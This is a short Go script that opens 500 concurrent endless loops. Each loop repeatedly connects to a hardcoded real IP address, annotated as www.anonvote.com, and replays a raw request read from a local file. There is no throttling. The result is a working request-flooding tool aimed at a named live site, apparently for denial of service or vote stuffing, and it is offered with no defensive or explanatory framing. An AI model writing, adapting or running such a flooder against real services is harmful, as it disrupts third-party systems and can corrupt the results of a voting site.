///bin/true; exec /usr/bin/env go run "$0" "$@"

package main

import (
  "net"
  "fmt"
//  "io"
  "io/ioutil"
  "sync"
)

func main() {
  buf, _ := ioutil.ReadFile("req.txt")
  dat := string(buf)
  
  var wg sync.WaitGroup
  for i := 0; i < 500; i++ {
    wg.Add(1)
    go func(){
      defer wg.Done()
      buff := make([]byte, 1)
      for {
        conn, _ := net.Dial("tcp", "212.83.162.108:80") // www.anonvote.com
        conn.Write([]byte(dat))
        conn.Read(buff)
        conn.Close()
        fmt.Print(".")
      }
    }()
  }
  wg.Wait()
}
